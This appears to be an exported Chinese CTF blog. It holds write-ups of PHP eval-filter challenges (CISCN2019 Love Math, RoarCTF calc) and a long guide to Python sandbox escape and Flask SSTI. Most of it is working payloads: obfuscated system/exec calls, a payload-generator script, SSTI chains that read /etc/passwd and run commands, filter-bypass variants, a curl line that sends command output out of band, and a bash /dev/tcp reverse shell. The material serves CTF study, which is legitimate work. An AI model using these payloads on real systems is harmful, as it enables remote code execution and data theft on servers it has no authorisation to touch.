0)&#123; //获取所有小于m的 &#125; if($m == 0) &#123; $func = implode($temp).&#x27;7&#x27;.str_repeat(&#x27;)&#x27;,sizeof($temp)).&#x27;;&#x27;; if(abs(eval(&#x27;return &#x27;.$func)-46) &lt; 1) &#123; echo $func.&#x27;&lt;/br&gt;&#x27;; &#125; &#125; else&#123; for($i = 0; $i &lt; sizeof($ch); $i ++)&#123; $temp[] = $ch[$i].&#x27;(&#x27;; helper($ch,$m-1,$temp); $temp = array_slice($temp,0,sizeof($temp)-1); &#125; &#125;&#125; 给些payload 123echo(serialize(file(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))));echo(next(file(end(scandir(chr(ord(hebrevc(crypt(phpversion(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))))));//只有第一行echo(join(file(end(scandir(next(each(scandir(chr(floor(tan(tan(atan(atan(ord(cos(chdir(next(scandir(chr(floor(tan(tan(atan(atan(ord(cos(fclose(tmpfile())))))))))))))))))))))))))))); 当然还会有别的方法，学不动了。###CISCN2019 love math地址：buuctf/Love Math题目给出源码 1234567891011121314151617181920$content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;); 主要限制了长度小于80，拦截了黑名单里的字符(引号重音号空格方括号)，并且只能使用白名单里的函数。这个正则是匹配变量名和函数名的。这题的关键就是base_convert这个函数可以把小写字母转成数字，这样就可以用一些纯字母的函数。先来个phpinfo 12echo base_convert(&#x27;phpinfo&#x27;,36,10);55490343972 所以c=base_convert(55490343972,10,36)()就可以查看phpinfo，观察disable_functions有没有禁用函数。接下来三种思路1、readfile读文件2、直接system调用系统命令读文件3、用$_GET或者getallheaders传参再执行命令。因为要用文件名，第一种方法肯定很长，先不考虑。####直接调用system既然可以用system，就试试直接执行命令，system(“ls”)可以转成c=base_convert(1751504350,10,36)(base_convert(784,10,36))看到当前目录只有index.php看来flag在根目录了。最容易想到的命令是cat /flag，不过最短的命令应该是nl /*或者od /*。因为不能用引号，而特殊符号字符不能通过base_convert生成，所以还需要想办法构造出/*这两个字符。给定的函数里面能返回字符串的除了base_convert就只有dechex了，但dexhex只能返回16进制而不能返回字符串。所以还需要处理，有两种选择： hex2bin把16进制转成字符串 用别的字符串来异或。先试第一种,引入hex2bin123456echo hexdec(bin2hex(&quot;nl /*&quot;));474260451114echo hexdec(bin2hex(&quot;od /*&quot;));478421200682echo base_convert(&#x27;hex2bin&#x27;,36,10);37907361743 所以system(“nl /*”)可以转换为base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(dechex(474260451114))),85个字符，长度超了。可以用一些花式php技巧缩短，动态执行函数可以同时赋值和使用，比如($pi=base_convert)(1751504350,10,36)($pi(37907361743,10,36)(dechex(474260451114)))然后再fuzz下看看base_convert能不能有更短的进制123456789101112131415for($x=33;$x&lt;=36;$x++)&#123; for($y=10;$y&lt;=16;$y++)&#123; $s = &#x27;hex2bin&#x27;; $num = base_convert($s,$x,$y); if(base_convert($num,$y,$x)==$s &amp;&amp; preg_match(&quot;/^\\d*$/&quot;,$num))&#123; echo $x.&#x27; &#x27;.$y.&#x27; &#x27;.base_convert($s,$x,$y).&#x27;&lt;/br&gt;&#x27;; &#125; &#125;&#125;34 10 2694196205534 11 1047604294834 14 143825541135 10 3203544237836 10 3790736174336 13 3761671484 挑最短的，变成($pi=base_convert)(128891498,14,36)($pi(3761671484,13,36)(dechex(474260451114)))正好80个字符。。。真的尴尬。不过又试了试发现system可以换成exec。1c=($pi=base_convert)(696468,10,36)($pi(3761671484,13,36)(dechex(474260451114))) 成功，再试试第二种。####用$_GET或者getallheaders传参就是构造个$_GET0这种经典格式。方括号被过滤了可以换成花括号，问题是下划线不能通过base_convert得到，还是需要hex2bin(dechex())这一串得到_GET，再用$$得到$_GET。另外除了从header获取还可以利用session。比如eval(hex2bin(session_id(session_start())))。session传hex编码的命令。12$pi=base_convert(3761671484,13,36)(dechex(1598506324));$$pi&#123;0&#125;($$pi&#123;1&#125;)&amp;0=system&amp;1=ls$pi=base_convert(1114322,10,36)^dechex(4369);$$pi&#123;0&#125;($$pi&#123;1&#125;)&amp;0=system&amp;1=ls//用异或的语句可以更短 或者用exec(getallheaders(){0})这种格式1($pi=base_convert)(696468,10,36)($pi(8768397090111664438,10,30)()&#123;0&#125;) ###roarctf calc这是个非预期解，很秀123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 这个代码过滤只是一部分，后端还有个waf会过滤所有字母。正解是绕waf，很多种方法都可以绕过去。但这里的做法是来硬的。用到了几个php的特性：1、(1).(2)等于字符串122、1/0等于INF，0/0等于NAN(PHP7特性)然后就是&amp;和|进行按位与按位或操作，一样是fuzz找可见字符,边生成边加入原有字符，最后能得到所有小写字母以及一些常用符号，不过没有下划线，可以用implode代替var_dump。我这里脚本直接生成payload了，因为有&amp;符号，最后需要再进行一次url编码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php$s = &#x27;0123456789NAINF-&#x27;;$target = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\\\\\\\]^_`&#123;|&#125;~&#x27;;$res = Array(&#x27;0&#x27;=&gt;&#x27;(((0).(0))&#123;0&#125;)&#x27;, &#x27;1&#x27;=&gt;&#x27;(((1).(0))&#123;0&#125;)&#x27;, &#x27;2&#x27;=&gt;&#x27;(((2).(0))&#123;0&#125;)&#x27;, &#x27;3&#x27;=&gt;&#x27;(((3).(0))&#123;0&#125;)&#x27;, &#x27;4&#x27;=&gt;&#x27;(((4).(0))&#123;0&#125;)&#x27;, &#x27;5&#x27;=&gt;&#x27;(((5).(0))&#123;0&#125;)&#x27;, &#x27;6&#x27;=&gt;&#x27;(((6).(0))&#123;0&#125;)&#x27;, &#x27;7&#x27;=&gt;&#x27;(((7).(0))&#123;0&#125;)&#x27;, &#x27;8&#x27;=&gt;&#x27;(((8).(0))&#123;0&#125;)&#x27;, &#x27;9&#x27;=&gt;&#x27;(((9).(0))&#123;0&#125;)&#x27;, &#x27;-&#x27;=&gt;&#x27;(((-1).(1))&#123;0&#125;)&#x27;, &quot;N&quot;=&gt;&#x27;(((0/0).(0))&#123;0&#125;)&#x27;, &quot;A&quot;=&gt;&#x27;(((0/0).(0))&#123;1&#125;)&#x27;, &quot;I&quot;=&gt;&#x27;(((1/0).(0))&#123;0&#125;)&#x27;, &#x27;F&#x27;=&gt;&#x27;(((1/0).(0))&#123;2&#125;)&#x27;); while(sizeof($res)&lt;strlen($target)) &#123; for($i=0;$i&lt;strlen($s);$i++)&#123; for($j=0;$j&lt;strlen($s);$j++)&#123; for($k=0;$k&lt;strlen($target);$k++)&#123; if(($s[$i]&amp;$s[$j]) === $target[$k]) &#123; if(!isset($res[$target[$k]]))&#123; $res[$target[$k]] = &#x27;(&#x27;.$res[$s[$i]].&#x27;&amp;&#x27;.$res[$s[$j]].&#x27;)&#x27;; &#125; &#125; if(($s[$i]|$s[$j]) === $target[$k]) &#123; if(!isset($res[$target[$k]]))&#123; $res[$target[$k]] = &#x27;(&#x27;.$res[$s[$i]].&#x27;|&#x27;.$res[$s[$j]].&#x27;)&#x27;; &#125; &#125; &#125; &#125; &#125; $new = array_unique(array_merge(array_keys($res),str_split($s))); $ns = implode(array_values($new)); if(strlen($ns) == strlen($s)) &#123; // echo $s.&#x27;&lt;/br&gt;&#x27;; break; &#125; else&#123; $s = $ns; &#125;&#125;krsort($res);var_dump($res);$f = &#x27;phpinfo&#x27;;$r = &#x27;(&#x27;;for($i=0;$i&lt;strlen($f);$i++) &#123; $r = $r.$res[$f[$i]].&#x27;.&#x27;;&#125;echo substr($r,0,strlen($r)-1).&#x27;)&#x27;;?&gt; 什么叫国际语言啊(战术后仰) ####参考链接https://www.cnblogs.com/BOHB-yunying/p/11616311.htmlhttps://www.xmsec.cc/ciscn-2019-web-wp/https://github.red/roarctf-web-writeup/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"python沙盒绕过&ssti一网打尽","slug":"python沙盒绕过&ssti一网打尽","date":"2019-11-05T15:02:16.000Z","updated":"2020-07-09T07:11:04.000Z","comments":true,"path":"2019/11/05/python沙盒绕过&ssti一网打尽/","link":"","permalink":"http://yoursite.com/2019/11/05/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87&ssti%E4%B8%80%E7%BD%91%E6%89%93%E5%B0%BD/","excerpt":"前两天去打一个线下赛被无情吊打，全体自闭。虽然大家基本都不是靠做题得的分，但web题是一道python的flask ssti。当时做的很慢。所以决定整理一下相关利用思路及绕过过滤的方法。","text":"前两天去打一个线下赛被无情吊打，全体自闭。虽然大家基本都不是靠做题得的分，但web题是一道python的flask ssti。当时做的很慢。所以决定整理一下相关利用思路及绕过过滤的方法。首先就是发现漏洞点，其实python的题一般也就是考这个了，试试404页面，或者其他返回用户输入的地方。输入或者算术式观察结果就行了。有时候是利用secret_key等信息泄露，这篇文章主要讲一些文件读取或命令执行的方法。首先先丢几个常见的payload。因为这就是我以前做题的第0步：找一堆payload挨个试( 1234&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[119].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)().__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;) 好像差不多，又好像不太一样，但是也不知道怎么来的也不知道怎么改。不过拆开来看其实还是有规律的。最开始可能不知道一堆下划线在干嘛，先总结一下：用到的主要有三种数据类型，函数、类、模块函数具有__globals__属性，返回一个字典当前函数全局空间的模块、函数及变量类有__dict__属性，是一个字典，包含的类型有函数等模块有__dict__属性，是一个字典，包含的类型有模块、函数、字典、类等，看区别： 1234&gt;&gt;&gt; [type(i) for i in object.__subclasses__()[59].__dict__.values()] #类的dict内容[&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;]&gt;&gt;&gt; [type(i) for i in object.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()]#模块的dict内容[&lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;str&#x27;&gt;] __builtins__是一个字典，包括已经被加载到内存中的函数类.__subclasses__() 一个内置函数，返回类的所有子类其实python中函数、模块本质都是一个对象，所以有些函数也可以调用__dict__方法，但可能就是空的所以可以理解为几个if else，查找可利用的函数(popen、system等)及模块(os、sys等)：1 遇到函数就访问__globals__2 遇到类就查看__dict__，查看可用的函数或跳转到13 遇到模块就查看__dict__，查看可用的模块函数等等，可以继续跳转到123知道了这些基本原则后，要有一个出发点，在命令行中可以直接调用object对象。不能直接调用object的话有以下方法：1、从一个容易获得的对象实例入手2、寻找它的基类来找到object对象3、遍历object对象的子类并从中寻找可以利用来执行命令的函数/模块。那么就一步一步来分析这个过程。就按照上面分的点来拆开分析：1、一个容易获得的对象实例我们需要利用这个对象来找到基类object，因为python3中object是一切对象的父类，所以只要有个对象就行了。最方便的就是内置对象比如字符串、列表、元组、字典等等。所以最开始的部分就是’’、[]、()、{}或其他能访问到的对象实例。2、寻找object基类以字符串为例，’’.__class__指向该实例对应的类，__class__功能和type函数一样，都是查看实例所在的类。’’.__class__属于type类，而type的父类是object。通过__base__方法或__mro__方法得到object类。 1234567891011121314&gt;&gt;&gt; type(&#x27;&#x27;)&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__ #和上一行等价&lt;class &#x27;str&#x27;&gt;&gt;&gt;&gt; type(&#x27;&#x27;.__class__)&lt;class &#x27;type&#x27;&gt;&gt;&gt;&gt; type(type(&#x27;&#x27;)) #和上一行等价&lt;class &#x27;type&#x27;&gt;&gt;&gt;&gt; type(&#x27;&#x27;).__base__&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__ #和上一行等价&lt;class &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1] #和上一行等价&lt;class &#x27;object&#x27;&gt; 3、遍历object对象的子类并从中寻找可以利用来执行命令的函数。首先获取object类的子类 1&gt;&gt;&gt; object.__subclasses__() 这里的结果是一个列表，列表内是所有class(python3)或type(python2)。而python2中object子类中包含file类，所以就有了上面的第一个payload 1234&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]&lt;type &#x27;file&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()#类似的读文件的类还有urllib.request.URLopener 另外还有一个直接的pyaload，利用builtin_function_or_method类的__call__方法调用eval，但一般内置的eval会被删除： 12&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#x27;1+1&#x27;)[].__getattribute__(&#x27;append&#x27;).__class__.__call__(eval, &#x27;1+1&#x27;) python3中移除了file类，所以需要找另外的方法。python中的函数有一个__globals__魔法方法，函数名.__globals__会返回一个当前语境空间下能使用的模块，方法和变量的字典。这样就可以无中生有再找到许多能利用的模块或函数。但这个方法的前提是要有个函数(或者method)，而有些类会有__init__、__enter__、__exit__等内置函数。写个程序找一下满足条件的类： 1234567l = len(object.__subclasses__())for i in range(l): for key in object.__subclasses__()[i].__dict__.keys(): t = type(object.__subclasses__()[i].__dict__.get(key)).__name__ if &#x27;wrapper&#x27; not in t: print (i, object.__subclasses__()[i],key) 找到这些类就有了一条链：类.函数.__globals__,之后就可以在globals中找可以执行命令的函数或者相关的库，获取到globals字典后，可以利用的方式大概分为这几种： 12345678910111)class.func.__globals__[目标函数/模块]globals里面就有可利用的模块/函数了，比如().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;sys&#x27;]改造下变成不需要序号的版本[c for c in object.__subclasses__() if &#x27;catch_warnings&#x27; in c.__name__][0].__init__.__globals__[&#x27;sys&#x27;]2)class.func.__globals__[&#x27;__builtins__&#x27;][目标函数]在globals里面的builtins里面找可用的函数，比如().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]3)class.func.__globals__[模块].__dict__[目标函数/模块]在globals里面其他模块的__dict__里面寻找，或者直接用hasattr(class.func.__globals__[key],目标函数/模块)，如().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;] 然后可以选择套娃，在globals中其他函数/类的函数的globals中再找，比如class.func.__globals__[函数].__globals__[目标函数/模块]，class.func.__globals__[模块].__dict__[模块].__dict__[目标函数/模块]，从globals中的某个类再遍历子类等等,又会有很多，但是意义就不是很大。最开始也可以递归遍历所有子类，会比直接object.__subclasses__()得到更多的类： 123456789101112131415161718192021def get_all_subclasses(cls): all_subclasses = [] for subclass in cls.__subclasses__(): if subclass.__name__ != &#x27;type&#x27;: all_subclasses.append(subclass) all_subclasses.extend(get_all_subclasses(subclass)) return all_subclassesdef get_cls(cls,target_cls,bases): if cls.__name__ == target_cls.split(&#x27;.&#x27;)[-1] and cls.__module__ == &#x27;.&#x27;.join(target_cls.split(&#x27;.&#x27;)[:-1]): print(bases) for subclass in cls.__subclasses__(): bases.append(subclass) if subclass.__name__ != &#x27;type&#x27;: get_cls(subclass,target_cls,bases) bases.pop()get_cls(object,&#x27;os._Environ&#x27;,[object]) 这样会找出一些比较深的利用链，比如os._Environ类的继承链 1&lt;class &#x27;object&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;collections.abc.Collection&#x27;&gt;, &lt;class &#x27;collections.abc.Mapping&#x27;&gt;, &lt;class &#x27;collections.abc.MutableMapping&#x27;&gt;, &lt;class &#x27;os._Environ&#x27;&gt;： 1object.__subclasses__()[103].__subclasses__()[2].__subclasses__()[1].__subclasses__()[0].__subclasses__()[0].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read() 当然好像也并没有什么用处(写了个脚本，按照上面三类方法查找所有可利用的payload： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556func_cls_dict = &#123;&#125;classes = get_all_subclasses(object)classes = object.__subclasses__()l = len(classes)# print(l)for i in range(l): for key in classes[i].__dict__.keys(): t = type(classes[i].__dict__.get(key)).__name__ if &#x27;function&#x27; == t: func_cls_dict[classes[i]] = key breakcommand_func = [&#x27;__import__&#x27;,&#x27;popen&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;eval&#x27;,&#x27;execfile&#x27;,&#x27;compile&#x27;,&#x27;open&#x27;,&#x27;file&#x27;]# command_func = [&#x27;popen&#x27;,&#x27;eval&#x27;,&#x27;exec&#x27;,&#x27;system&#x27;]command_module = [&#x27;os&#x27;, &#x27;platform&#x27;, &#x27;subprocess&#x27;, &#x27;timeit&#x27;, &#x27;importlib&#x27;, &#x27;codecs&#x27;, &#x27;sys&#x27;, &#x27;command&#x27;]def get_func_cls(command_item,find_type=0): find_item = &#x27;function&#x27; if find_type == 1: find_item = &#x27;module&#x27; print(&#x27;-&#x27;*20+&#x27;class.func.__globals__[target]&#x27;+&#x27;-&#x27;*20) for func_cls in func_cls_dict: usable = 0 for com_func in command_item: func_globals = getattr(func_cls,func_cls_dict[func_cls]).__globals__ if com_func in func_globals.keys() and find_item in type(func_globals[com_func]).__name__: sys.stdout.write(com_func+&#x27; &#x27;) usable = 1 if com_func == command_item[-1] and usable: sys.stdout.write(func_cls_dict[func_cls]+&#x27; &#x27;) print(func_cls) print(&#x27;-&#x27;*20+&quot;class.func.__globals__[&#x27;__builtins__&#x27;][target]&quot;+&#x27;-&#x27;*20) for func_cls in func_cls_dict: for com_func in command_item: if com_func in getattr(func_cls,func_cls_dict[func_cls]).__globals__[&#x27;__builtins__&#x27;].keys(): sys.stdout.write(com_func+&#x27; key: __builtins__ &#x27;) sys.stdout.write(&#x27;func: &#x27;+func_cls_dict[func_cls]+&#x27; &#x27;) print(func_cls) print(&#x27;-&#x27;*20+&#x27;class.func.__globals__[key].__dict__[target]&#x27;+&#x27;-&#x27;*20) for func_cls in func_cls_dict: for com_func in command_item: func_globals = getattr(func_cls,func_cls_dict[func_cls]).__globals__ for key in func_globals.keys(): if hasattr(func_globals[key],com_func) and find_item in type(getattr(func_globals[key],com_func)).__name__: sys.stdout.write(com_func+&#x27; key: &#x27;+key+&#x27; &#x27;) sys.stdout.write(&#x27;func: &#x27;+func_cls_dict[func_cls]+&#x27; &#x27;) print(func_cls)get_func_cls(command_func,0) 只从object基类的子类中寻找，有300多种可用payload。不过其实用最基础的就够了，因为一般不会针对类名去进行过滤，而是针对一些特殊符号来进行过滤。接下来总结一下绕过过滤的方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364651)过滤方括号列表的下标用__getitem__代替，或者用pop代替。字典的键值可以用get方法或者values(keys().index(&#x27;aaa&#x27;))(py2)代替，__dict__[&#x27;os&#x27;]这种可以直接用os代替&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].__dict__[&#x27;popen&#x27;]可以转化为：&#x27;&#x27;.__class__.__mro__.__getitem__(-1).__subclasses__().pop(59).__init__.func_globals.get(&#x27;linecache&#x27;).os.popen(&#x27;whoami&#x27;).read()2)过滤引号用chr()和加号绕过3)过滤system、eval、os等用字符串拼接绕过，编码绕过，比如eval变为&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)4)过滤globals__getattribute__(&#x27;func_global&#x27;+&#x27;s&#x27;) #python2__getattribute__(&#x27;__global&#x27;+&#x27;s__&#x27;) #python2 python3[x for x in object.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;) #python2这是利用类的实例化，没有利用函数，也就没有利用到globals，找一下还没发现其他满足这种用法的，但感觉应该会有。5)过滤subclasses利用getattr()，过滤小数点也用它getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#x27;__cla&#x27;+&#x27;ss__&#x27;),&#x27;__mr&#x27;+&#x27;o__&#x27;)[1],&#x27;__subclas&#x27;+&#x27;ses__&#x27;)()[104],&#x27;__init__&#x27;),&#x27;__glob&#x27;+&#x27;al&#x27;+&#x27;s__&#x27;)[&#x27;sy&#x27;+&#x27;s&#x27;],&#x27;mod&#x27;+&#x27;ules&#x27;)[&#x27;o&#x27;+&#x27;s&#x27;],&#x27;sy&#x27;+&#x27;ste&#x27;+&#x27;m&#x27;)(&#x27;l&#x27;+&#x27;s&#x27;)利用__call__&#x27;&#x27;.zfill.__class__.__call__(eval,&#x27;1+1&#x27;)或者reload(__builtiins__)另外python3.6以上也可以用fstring执行命令，但是在绕过的方面并没什么优点f&quot;&#123;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&#125;&quot;还有一些只有在flask之类的模板中才能执行：过滤下划线&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class=class&amp;usc=_()[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][-1]同时过滤方括号的话，利用flask的attr方法%22%22|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(77)|attr(request.args.init)|attr(request.args.glo)|attr(request.args.ae)(%22popen%22)(%22ls%22)|attr(request.args.re)()&#125;&#125;&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;init=__init__&amp;glo=__globals__&amp;ae=__getitem__&amp;re=read过滤小数点&#123;&#123;request[request[&#x27;a&#x27;+&#x27;rgs&#x27;][&#x27;x1&#x27;]][request[&#x27;a&#x27;+&#x27;rgs&#x27;][&#x27;x2&#x27;]][-1][request[&#x27;a&#x27;+&#x27;rgs&#x27;][&#x27;x3&#x27;]]()[117][request[&#x27;a&#x27;+&#x27;rgs&#x27;][&#x27;x4&#x27;]][request[&#x27;a&#x27;+&#x27;rgs&#x27;][&#x27;x5&#x27;]][&#x27;popen&#x27;](&#x27;cat+/fl*&#x27;)[&#x27;read&#x27;]()[::-1]&#125;&#125;&amp;x1=__class__&amp;x2=__mro__&amp;x3=__subclasses__&amp;x4=__init__&amp;x5=__globals__过滤竖线格式化字符串绕过，但是需要方括号&#x27;&#123;0:c&#125;&#x27;.format(98)&quot;%c&quot;%(98)过滤双大括号&#123;% for c in [][&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]() %&#125; &#123;% if c[&#x27;__name__&#x27;] == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c[&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;values&#x27;]() %&#125; &#123;% if b[&#x27;__class__&#x27;]==&#123;&#125;[&#x27;__class__&#x27;] %&#125; &#123;% if &#x27;eval&#x27; in b[&#x27;keys&#x27;]() %&#125; &#123;% if b[&#x27;eval&#x27;](&#x27;getattr(__import__(&quot;os&quot;),&quot;popen&quot;)(&quot;curl your_host/`/readflag`&quot;)&#x27;) %&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&#123;% endfor %&#125;或者利用控制语句带外读取数据&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;或者逐位爆破&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/test&#x27;).read()[0:1]==&#x27;p&#x27; %&#125;~p0~&#123;% endif %&#125;过滤subclasses、classflask可以用键值代替点，也可以用attr&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1][&#x27;__subclasses__&#x27;]&#125;&#125;&#123;&#123;request[&#x27;__class__&#x27;]&#125;&#125;request|attr(&quot;__class__&quot;)request|attr(request[&#x27;args&#x27;][&#x27;x1&#x27;])利用cookie或者form绕过&#123;&#123;((request|attr(request.cookies.get(&#x27;aa&#x27;))|attr(request.cookies.get(&#x27;bb&#x27;))|list).pop(-1))|attr(request.cookies.get(&#x27;cc&#x27;))()&#125;&#125;Cookie: aa=__class__;bb=__mro__;cc=__subclasses__一些不常用的执行命令方法__import__(&#x27;builtins&#x27;).__loader__.load_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)map(__import__(&#x27;os&#x27;).system,[&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27;,])sys.call_tracing(__import__(&#x27;os&#x27;).system,(&#x27;whoami&#x27;,)) 